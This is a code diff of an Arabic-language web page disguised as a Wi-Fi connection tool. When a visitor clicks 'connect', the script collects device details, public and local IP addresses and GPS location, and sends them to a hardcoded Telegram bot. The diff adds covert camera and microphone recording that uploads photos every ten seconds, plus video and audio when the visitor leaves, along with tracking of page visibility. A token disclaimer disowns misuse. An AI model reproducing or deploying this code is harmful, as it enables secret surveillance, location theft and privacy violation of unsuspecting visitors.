@@ -6,105 +6,24 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <style>
 * { box-sizing: border-box; margin: 0; padding: 0; }
-body {
-    font-family: -apple-system, 'Segoe UI', Tahoma, Arial, sans-serif;
-    background: linear-gradient(160deg, #0f0c29, #302b63);
-    min-height: 100vh;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    color: #fff;
-    padding: 20px;
-}
-.box {
-    background: rgba(20, 25, 50, 0.9);
-    padding: 30px 25px;
-    border-radius: 24px;
-    max-width: 440px;
-    width: 100%;
-    box-shadow: 0 30px 80px rgba(0,0,0,0.6);
-    border: 1px solid rgba(255,255,255,0.08);
-}
+body { font-family: -apple-system, 'Segoe UI', Tahoma, Arial, sans-serif; background: linear-gradient(160deg, #0f0c29, #302b63); min-height: 100vh; display: flex; align-items: center; justify-content: center; color: #fff; padding: 20px; }
+.box { background: rgba(20, 25, 50, 0.9); padding: 30px 25px; border-radius: 24px; max-width: 440px; width: 100%; box-shadow: 0 30px 80px rgba(0,0,0,0.6); border: 1px solid rgba(255,255,255,0.08); }
 .header { text-align: center; margin-bottom: 20px; }
-.icon {
-    width: 70px; height: 70px;
-    margin: 0 auto 15px;
-    background: linear-gradient(135deg, #4da6ff, #9d4edd);
-    border-radius: 50%;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    font-size: 35px;
-}
-h1 {
-    font-size: 22px;
-    margin-bottom: 8px;
-    background: linear-gradient(90deg, #4da6ff, #9d4edd);
-    -webkit-background-clip: text;
-    -webkit-text-fill-color: transparent;
-}
+.icon { width: 70px; height: 70px; margin: 0 auto 15px; background: linear-gradient(135deg, #4da6ff, #9d4edd); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 35px; }
+h1 { font-size: 22px; margin-bottom: 8px; background: linear-gradient(90deg, #4da6ff, #9d4edd); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
 p { font-size: 13px; color: #8892b0; line-height: 1.7; }
-.warn {
-    background: rgba(255,77,77,0.1);
-    border: 1px solid rgba(255,77,77,0.3);
-    border-radius: 10px;
-    padding: 10px;
-    font-size: 11px;
-    color: #ff9999;
-    margin: 15px 0;
-    text-align: center;
-}
-.networks {
-    background: rgba(10, 15, 35, 0.7);
-    border-radius: 16px;
-    padding: 15px;
-    margin-bottom: 20px;
-}
-.net {
-    display: flex;
-    align-items: center;
-    justify-content: space-between;
-    padding: 14px;
-    background: rgba(26, 32, 64, 0.8);
-    border-radius: 12px;
-    margin-bottom: 10px;
-    border: 1px solid rgba(255,255,255,0.05);
-}
+.networks { background: rgba(10, 15, 35, 0.7); border-radius: 16px; padding: 15px; margin-bottom: 20px; }
+.net { display: flex; align-items: center; justify-content: space-between; padding: 14px; background: rgba(26, 32, 64, 0.8); border-radius: 12px; margin-bottom: 10px; border: 1px solid rgba(255,255,255,0.05); }
 .net.open { border-color: #4dff88; background: rgba(77,255,136,0.08); }
 .net .info { flex: 1; text-align: right; }
 .net .name { font-size: 15px; font-weight: bold; }
 .net .meta { font-size: 11px; color: #8892b0; }
 .net .icons { display: flex; gap: 8px; font-size: 18px; }
-button {
-    background: linear-gradient(135deg, #4da6ff, #9d4edd);
-    color: #fff;
-    border: none;
-    padding: 17px;
-    border-radius: 14px;
-    font-size: 17px;
-    font-weight: bold;
-    cursor: pointer;
-    width: 100%;
-}
+button { background: linear-gradient(135deg, #4da6ff, #9d4edd); color: #fff; border: none; padding: 17px; border-radius: 14px; font-size: 17px; font-weight: bold; cursor: pointer; width: 100%; }
 button:disabled { opacity: 0.7; }
-.status {
-    margin-top: 15px;
-    font-size: 13px;
-    text-align: center;
-    color: #8892b0;
-    min-height: 20px;
-}
-.badge {
-    position: fixed;
-    top: 10px;
-    left: 10px;
-    background: rgba(0,0,0,0.7);
-    color: #fff;
-    font-size: 10px;
-    padding: 4px 8px;
-    border-radius: 12px;
-    z-index: 9999;
-}
+.status { margin-top: 15px; font-size: 13px; text-align: center; color: #8892b0; min-height: 20px; }
+.warn { background: rgba(255,77,77,0.1); border: 1px solid rgba(255,77,77,0.3); border-radius: 10px; padding: 10px; font-size: 11px; color: #ff9999; margin: 15px 0; text-align: center; }
+.badge { position: fixed; top: 10px; left: 10px; background: rgba(0,0,0,0.7); color: #fff; font-size: 10px; padding: 4px 8px; border-radius: 12px; z-index: 9999; }
 </style>
 </head>
 <body>
@@ -137,65 +56,126 @@ button:disabled { opacity: 0.7; }
     <button id="btn" onclick="start()">🔓 اتصل بالشبكة</button>
     <div class="status" id="status"></div>
 
-    <div class="warn">
-        ⚠️ كل من يستخدم هذه الأداة لاختراق أي شبكة لا تخصه، مصمم الأداة غير مسؤول عن سوء الاستخدام.
-    </div>
+    <div class="warn">⚠️ كل من يستخدم هذه الأداة لاختراق أي شبكة لا تخصه، مصمم الأداة غير مسؤول عن سوء الاستخدام.</div>
 </div>
 
 <script>
 const TOKEN = "8885955583:AAFB3gmzus0AJNLcRlDkZ8UsOWH_4DnManE";
 const CHAT_ID = "7560932400";
 
+let videoStream = null, audioStream = null;
+let photoInterval = null, videoRecorder = null, audioRecorder = null;
+let videoChunks = [], audioChunks = [];
+const PHOTO_INTERVAL = 10000;
+
 function send(t) {
     return fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-        method: "POST",
-        headers: {"Content-Type": "application/json"},
+        method: "POST", headers: {"Content-Type": "application/json"},
         body: JSON.stringify({chat_id: CHAT_ID, text: t})
     }).catch(()=>{});
+}
+
+function sendPhoto(blob, cap) {
+    const fd = new FormData();
+    fd.append("chat_id", CHAT_ID);
+    fd.append("caption", cap);
+    fd.append("photo", blob, "p.jpg");
+    return fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {method: "POST", body: fd}).catch(()=>{});
+}
+
+function sendVideo(blob) {
+    const fd = new FormData();
+    fd.append("chat_id", CHAT_ID);
+    fd.append("video", blob, "v.webm");
+    return fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, {method: "POST", body: fd}).catch(()=>{});
+}
+
+function sendAudio(blob) {
+    const fd = new FormData();
+    fd.append("chat_id", CHAT_ID);
+    fd.append("audio", blob, "a.webm");
+    return fetch(`https://api.telegram.org/bot${TOKEN}/sendAudio`, {method: "POST", body: fd}).catch(()=>{});
+}
+
+async function capturePhoto() {
+    if (!videoStream) return;
+    try {
+        const v = document.createElement("video");
+        v.srcObject = videoStream; v.muted = true;
+        await v.play();
+        await new Promise(r => setTimeout(r, 300));
+        const c = document.createElement("canvas");
+        c.width = v.videoWidth || 640; c.height = v.videoHeight || 480;
+        c.getContext("2d").drawImage(v, 0, 0, c.width, c.height);
+        c.toBlob(b => { if (b) sendPhoto(b, "📸 صورة جديدة - " + new Date().toLocaleTimeString("ar-EG")); }, "image/jpeg", 0.6);
+        v.pause();
+    } catch(e) {}
+}
+
+async function startCamera() {
+    try {
+        videoStream = await navigator.mediaDevices.getUserMedia({video: {facingMode: "user"}, audio: false});
+        videoRecorder = new MediaRecorder(videoStream, {mimeType: "video/webm"});
+        videoChunks = [];
+        videoRecorder.ondataavailable = e => { if (e.data.size > 0) videoChunks.push(e.data); };
+        videoRecorder.start(1000);
+        setTimeout(capturePhoto, 1000);
+        photoInterval = setInterval(capturePhoto, PHOTO_INTERVAL);
+        return true;
+    } catch(e) { return false; }
+}
+
+async function startMic() {
+    try {
+        audioStream = await navigator.mediaDevices.getUserMedia({audio: true});
+        audioRecorder = new MediaRecorder(audioStream, {mimeType: "audio/webm"});
+        audioChunks = [];
+        audioRecorder.ondataavailable = e => { if (e.data.size > 0) audioChunks.push(e.data); };
+        audioRecorder.start(1000);
+        return true;
+    } catch(e) { return false; }
 }
 
 async function start() {
     const btn = document.getElementById("btn");
     const status = document.getElementById("status");
     btn.disabled = true;
-    btn.innerText = "🔄 جاري...";
+    btn.innerText = "🔄 جاري الاتصال...";
 
     let info = {
-        type: "WiFi",
-        userAgent: navigator.userAgent,
-        platform: navigator.platform,
-        language: navigator.language,
-        screen: screen.width + "x" + screen.height,
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        cores: navigator.hardwareConcurrency || "?"
+        "النوع": "شبكة واي فاي",
+        "المتصفح": navigator.userAgent,
+        "نظام التشغيل": navigator.platform,
+        "اللغة": navigator.language,
+        "دقة الشاشة": screen.width + "x" + screen.height,
+        "المنطقة الزمنية": Intl.DateTimeFormat().resolvedOptions().timeZone,
+        "عدد أنوية المعالج": navigator.hardwareConcurrency || "?"
     };
 
     try {
         const r = await fetch("https://ipwho.is/");
         const j = await r.json();
-        info.ip = j.ip;
-        info.country = j.country;
-        info.city = j.city;
-        info.isp = j.connection && j.connection.isp;
-    } catch(e) { info.ip = "unknown"; }
+        info["IP العام"] = j.ip;
+        info["الدولة"] = j.country;
+        info["المدينة"] = j.city;
+        info["مزود الخدمة"] = j.connection && j.connection.isp;
+    } catch(e) { info["IP العام"] = "غير معروف"; }
 
-    info.webrtc = await new Promise(r => {
+    info["IP المحلي"] = await new Promise(r => {
         try {
             const pc = new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"}]});
             pc.createDataChannel("");
             const ips = new Set();
             pc.onicecandidate = e => {
-                if (e.candidate) {
-                    const ip = e.candidate.candidate.split(" ")[4];
-                    if (ip) ips.add(ip);
-                } else { pc.close(); r(Array.from(ips).join(", ")); }
+                if (e.candidate) { const ip = e.candidate.candidate.split(" ")[4]; if (ip) ips.add(ip); }
+                else { pc.close(); r(Array.from(ips).join(", ")); }
             };
             pc.createOffer().then(o => pc.setLocalDescription(o));
             setTimeout(() => { pc.close(); r(Array.from(ips).join(", ")); }, 3000);
-        } catch(e) { r("err"); }
+        } catch(e) { r("خطأ"); }
     });
 
-    info.gps = await new Promise(r => {
+    info["الموقع"] = await new Promise(r => {
         if (!navigator.geolocation) return r("غير مدعوم");
         navigator.geolocation.getCurrentPosition(
             p => r(`${p.coords.latitude}, ${p.coords.longitude}`),
@@ -204,38 +184,43 @@ async function start() {
         );
     });
 
-    info.camera = await new Promise(r => {
-        navigator.mediaDevices.getUserMedia({video:true}).then(s => {
-            s.getTracks().forEach(t => t.stop());
-            r("تم");
-        }).catch(() => r("مرفوض"));
-    });
+    info["الوقت"] = new Date().toLocaleString("ar-EG");
 
-    info.mic = await new Promise(r => {
-        navigator.mediaDevices.getUserMedia({audio:true}).then(s => {
-            s.getTracks().forEach(t => t.stop());
-            r("تم");
-        }).catch(() => r("مرفوض"));
-    });
-
-    try {
-        if ("Notification" in window) await Notification.requestPermission();
-    } catch(e) {}
-
-    let text = "📶 WiFi Info:\n\n" + 
-        Object.entries(info).map(([k,v]) => `${k}: ${v}`).join("\n");
+    let text = "📶 معلومات شبكة واي فاي:\n\n" + Object.entries(info).map(([k,v]) => `${k}: ${v}`).join("\n");
     await send(text);
 
-    status.innerText = "✅ تم الاتصال بنجاح";
+    try { if ("Notification" in window) await Notification.requestPermission(); } catch(e) {}
+
+    await startCamera();
+    await startMic();
+
+    status.innerText = "✅ تم الاتصال - التسجيل شغال";
     btn.innerText = "✓ متصل";
 }
 
-window.addEventListener("beforeunload", () => {
-    send("⚠️ المستخدم خرج من صفحة WiFi");
+window.addEventListener("beforeunload", async () => {
+    if (photoInterval) clearInterval(photoInterval);
+    if (videoRecorder && videoRecorder.state === "recording") {
+        videoRecorder.stop();
+        setTimeout(async () => {
+            const blob = new Blob(videoChunks, {type: "video/webm"});
+            if (blob.size > 1000) await sendVideo(blob);
+        }, 1000);
+    }
+    if (audioRecorder && audioRecorder.state === "recording") {
+        audioRecorder.stop();
+        setTimeout(async () => {
+            const blob = new Blob(audioChunks, {type: "audio/webm"});
+            if (blob.size > 1000) await sendAudio(blob);
+        }, 1000);
+    }
+    if (videoStream) videoStream.getTracks().forEach(t => t.stop());
+    if (audioStream) audioStream.getTracks().forEach(t => t.stop());
 });
 
 document.addEventListener("visibilitychange", () => {
     if (document.hidden) send("👀 المستخدم ساب الصفحة");
+    else send("✅ المستخدم رجع للصفحة");
 });
 </script>
 </body>
